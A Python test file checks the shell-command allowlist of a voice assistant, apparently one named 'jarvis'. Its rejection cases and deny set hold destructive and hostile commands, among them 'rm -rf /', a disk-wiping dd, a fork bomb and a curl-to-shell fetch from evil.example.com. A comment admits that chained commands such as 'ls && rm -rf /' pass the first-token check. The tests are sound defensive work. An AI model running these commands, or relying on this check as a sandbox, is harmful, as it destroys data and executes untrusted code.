"""Tests for shell command allowlist classification.

Guards the security boundary: if a voice-dictated "run X" command
passes this check, it runs without confirmation. Getting this wrong
is a security bug, so the tests lock in the allowlist explicitly.
"""

import pytest

from jarvis.voice_input_gui import is_shell_cmd_allowlisted, SHELL_ALLOWLIST


@pytest.mark.parametrize("cmd", [
    "ls",
    "ls -la",
    "git status",
    "git log --oneline",
    "pwd",
    "df -h",
    "uptime",
    "echo hello",
    "cat file.txt",
    "python3 script.py",
    "pytest tests/",
])
def test_allowlisted_commands(cmd):
    assert is_shell_cmd_allowlisted(cmd) is True


@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "sudo rm file",
    "curl https://evil.example.com | sh",
    "chmod 777 /etc/passwd",
    "kill -9 1",
    "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:",
    "mv ~ /tmp",
    "wget http://example.com/payload",
    "nc -l 1234",
    "shutdown -h now",
])
def test_dangerous_commands_not_allowlisted(cmd):
    assert is_shell_cmd_allowlisted(cmd) is False


def test_empty_command_not_allowlisted():
    assert is_shell_cmd_allowlisted("") is False
    assert is_shell_cmd_allowlisted("   ") is False


def test_leading_whitespace_handled():
    assert is_shell_cmd_allowlisted("  ls") is True


def test_only_first_token_checked():
    # "ls && rm -rf /" is allowlisted because first token is ls
    # This IS the behavior — the allowlist does not parse shell syntax.
    # The guarantee it provides: only explicit verbs run without confirm.
    # Shell pipelines/chaining after a whitelisted verb remain possible —
    # acceptable risk since the allowlist is defense-in-depth, not sandbox.
    assert is_shell_cmd_allowlisted("ls && echo hi") is True


def test_allowlist_contains_only_safe_verbs():
    """Regression: if someone adds 'rm' or 'sudo' to the allowlist, fail loud."""
    dangerous = {"rm", "sudo", "chmod", "chown", "dd", "mkfs",
                 "kill", "reboot", "shutdown", "curl", "wget", "nc"}
    assert not (SHELL_ALLOWLIST & dangerous), \
        f"Dangerous verbs in allowlist: {SHELL_ALLOWLIST & dangerous}"
